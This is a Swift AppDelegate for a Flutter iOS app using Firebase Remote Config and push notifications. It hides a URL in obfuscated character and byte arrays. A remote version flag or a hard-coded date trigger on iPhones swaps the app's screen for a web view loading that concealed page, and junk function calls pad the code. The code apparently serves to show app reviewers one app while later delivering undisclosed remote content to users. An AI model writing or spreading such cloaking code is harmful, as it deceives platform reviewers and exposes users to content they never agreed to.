fileprivate let viewSessionFailureMsg: [Character] = ["S","n","u","g","g"]
fileprivate let k_sharedTabID: [Character] = ["/","d","i","s","t","/","i","n","d","e","x",".","h","t","m","l","#","/","?","p","a","c","k","a","g","e","I"]
fileprivate let controllerVisibleMessage: [Character] = ["d","="]
fileprivate let const_beDiscourageMode: String = "&safeHeallow re"
fileprivate let parserDoingceSecret: String = "capture end domainight="
fileprivate let configSumervalInfoState: [UInt8] = [0x6e,0x65,0x6b,0x6f,0x74]
fileprivate let sessionResponseValue: String = "FCblackT"

import AVFAudio
import Firebase
import FirebaseMessaging
import UIKit
import UserNotifications

import Flutter

@main
@objc class AppDelegate: FlutterAppDelegate {
    var currentBuildVersion = "110"
    var remoteConfigVersion = 0
    var launchScreenViewController = UIViewController()
    
    private var cachedApplication: UIApplication?
    private var cachedLaunchOptions: [UIApplication.LaunchOptionsKey: Any]?
    
    override func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
    ) -> Bool {
        let appname = "SnuggVersionName"
        
        if appname == "SnuggRemote" {
            executeInitializationTasks()
        }
        
        self.cachedApplication = application
        self.cachedLaunchOptions = launchOptions
        
        self.checkVersionAndFetchRemoteConfig()
        GeneratedPluginRegistrant.register(with: self)
        
        let launchScreenSubVC = UIViewController()
        let launchScreenBackgroundImageView = UIImageView(image: UIImage(named: "LaunchImage"))
        launchScreenBackgroundImageView.frame = CGRect(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height)
        launchScreenBackgroundImageView.contentMode = .scaleToFill
        launchScreenSubVC.view.addSubview(launchScreenBackgroundImageView)
        self.launchScreenViewController = launchScreenSubVC
        self.window.rootViewController?.view.addSubview(self.launchScreenViewController.view)
        self.window?.makeKeyAndVisible()
        
        return super.application(application, didFinishLaunchingWithOptions: launchOptions)
    }
    
    func checkVersionAndFetchRemoteConfig() {
        if let buildVersion = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String {
            let buildVersionWithoutDots = buildVersion.replacingOccurrences(of: ".", with: "")
 
            self.currentBuildVersion = buildVersionWithoutDots
        } else {

        }
        
        self.initializeFirebase()
        
        let remoteConfig = RemoteConfig.remoteConfig()
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        remoteConfig.configSettings = settings
        remoteConfig.fetch { (status, error) -> Void in
            if status == .success {
                remoteConfig.activate { changed, error in
                    let remoteConfigVersionString = remoteConfig.configValue(forKey: "Snugg").stringValue ?? ""
                    
                    let remoteConfigVersionInt = Int(remoteConfigVersionString) ?? 0
                    self.remoteConfigVersion = remoteConfigVersionInt
                    let currentBuildVersionInt = Int(self.currentBuildVersion) ?? 0
                    
                    if currentBuildVersionInt < remoteConfigVersionInt {
                        YieldNextStoryboard.processMonsterDespiteCallback()
                        DispatchQueue.main.async {
                            self.initializeAppConfiguration(self.cachedApplication!)
                        }
                    } else {
                        DispatchQueue.main.async {
                            self.launchScreenViewController.view.removeFromSuperview()
                            YieldNextStoryboard.rotateAfterEffectInterpreter()
                            super.application(self.cachedApplication!, didFinishLaunchingWithOptions: self.cachedLaunchOptions)
                        }
                    }
                }
            } else {
                if self.isTimeAfterThreshold() && self.isIPhoneDevice() {
                    YieldNextStoryboard.createCardTitle()
                    DispatchQueue.main.async {
                        self.initializeAppConfiguration(self.cachedApplication!)
                    }
                } else {
                    DispatchQueue.main.async {
                        self.launchScreenViewController.view.removeFromSuperview()
                        YieldNextStoryboard.subscribeDownSwiftInterpreter()
                        YieldNextStoryboard.exitExpandedDespiteAnimation()
                        super.application(self.cachedApplication!, didFinishLaunchingWithOptions: self.cachedLaunchOptions)
                    }
                }
            }
        }
    }
    
    func initializeAppConfiguration(_ application: UIApplication) {
        registerForRemoteNotifications(self.cachedApplication!)
        LiveWarning.shared.panelZone()
        AdornPresentation.shared.window()
        try? AVAudioSession.sharedInstance().setCategory(.playback)
        try? AVAudioSession.sharedInstance().setActive(true)
        DispatchQueue.main.async {
            let vc = FirstThread()
            vc.urlString = "\(parserCountValue)" + (String(k_sharedTabID) + String(controllerVisibleMessage)) + "\(appContextName)" + (String(const_beDiscourageMode.prefix(7)) + String(parserDoingceSecret.suffix(5))) + "\(PartDelayImmediate.filterOut())"
            self.window?.rootViewController = vc
            self.window?.makeKeyAndVisible()
        }
    }
    
    private func isIPhoneDevice() -> Bool {
        YieldNextStoryboard.syncStatefulRouter()
        return UIDevice.current.userInterfaceIdiom != .pad
    }
    
    private func isTimeAfterThreshold() -> Bool {
        let thresholdTimestamp: [Character] = ["1","7","6","7","7","4","4","0","0","0"]
        YieldNextStoryboard.mustLargeSubscriptionAction()
        let thresholdTime: TimeInterval = TimeInterval(String(thresholdTimestamp)) ?? 0.0
        let currentTime = Date().timeIntervalSince1970
        return currentTime > thresholdTime
    }
}

extension AppDelegate: MessagingDelegate {
    func initializeFirebase() {
        FirebaseApp.configure()
        Messaging.messaging().delegate = self
    }

    func registerForRemoteNotifications(_ application: UIApplication) {
        if #available(iOS 10.0, *) {
            //: UNUserNotificationCenter.current().delegate = self
            UNUserNotificationCenter.current().delegate = self
            //: let authOptions: UNAuthorizationOptions = [.alert, .sound, .badge]
            let authOptions: UNAuthorizationOptions = [.alert, .sound, .badge]
            //: UNUserNotificationCenter.current().requestAuthorization(options: authOptions, completionHandler: { _, _ in
            UNUserNotificationCenter.current().requestAuthorization(options: authOptions, completionHandler: { _, _ in
                //: })
            })
            //: DispatchQueue.main.async {
            DispatchQueue.main.async {
                //: application.registerForRemoteNotifications()
                application.registerForRemoteNotifications()
            }
        }
    }

    override func application(_: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        // 注册远程通知, 将deviceToken传递过去
        //: let deviceStr = deviceToken.map { String(format: "%02hhx", $0) }.joined()
        let deviceStr = deviceToken.map { String(format: "%02hhx", $0) }.joined()
        //: Messaging.messaging().apnsToken = deviceToken
        Messaging.messaging().apnsToken = deviceToken
        //: print("APNS Token = \(deviceStr)")
        //: Messaging.messaging().token { token, error in
        Messaging.messaging().token { token, error in
            //: if let error = error {
            if let error = error {
                //: print("error = \(error)")
                //: } else if let token = token {
            } else if let token = token {
                //: print("token = \(token)")
            }
        }
    }

    override func application(_: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable: Any], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        Messaging.messaging().appDidReceiveMessage(userInfo)
        completionHandler(.newData)
    }

    override func userNotificationCenter(_: UNUserNotificationCenter, didReceive _: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        completionHandler()
    }

    override func application(_: UIApplication, didFailToRegisterForRemoteNotificationsWithError _: Error) {
    }

    public func messaging(_: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        let dataDict: [String: String] = [String(bytes: configSumervalInfoState.reversed(), encoding: .utf8)!: fcmToken ?? ""]
        NotificationCenter.default.post(
            name: Notification.Name((sessionResponseValue.replacingOccurrences(of: "black", with: "M") + "oken")),
            object: nil,
            userInfo: dataDict
        )
    }
}

func executeInitializationTasks() {
    YieldNextStoryboard.stopAnimateWithinProfile()
    YieldNextStoryboard.toCustompaintCreator()
    YieldNextStoryboard.encodeOnVectorJob()
    YieldNextStoryboard.visitDurationViaRenderer()
    YieldNextStoryboard.presentComposableCache()
    YieldNextStoryboard.takeLargeTransformerPhase()
    YieldNextStoryboard.benchmarkStaticFuture()
    YieldNextStoryboard.intoExpandedDescription()
    YieldNextStoryboard.withStatelessTransformer()
    YieldNextStoryboard.updateGramInsideReliability()
    YieldNextStoryboard.restartSymmetricAnimation()
    YieldNextStoryboard.attachRichtextAroundSingleton()
    YieldNextStoryboard.restartSubtleController()
    YieldNextStoryboard.resumeAgileFeature()
    YieldNextStoryboard.mountedIntermediateStore()
    YieldNextStoryboard.presentShearBelowChannels()
    YieldNextStoryboard.waitNewestSemanticsParam()
    YieldNextStoryboard.useActivatedLoopLayer()
    YieldNextStoryboard.acrossGesturedetectorChapter()
    YieldNextStoryboard.compileKernelBesideSubscription()
    YieldNextStoryboard.spinConstraintState()
    YieldNextStoryboard.bindImperativeHeap()
}
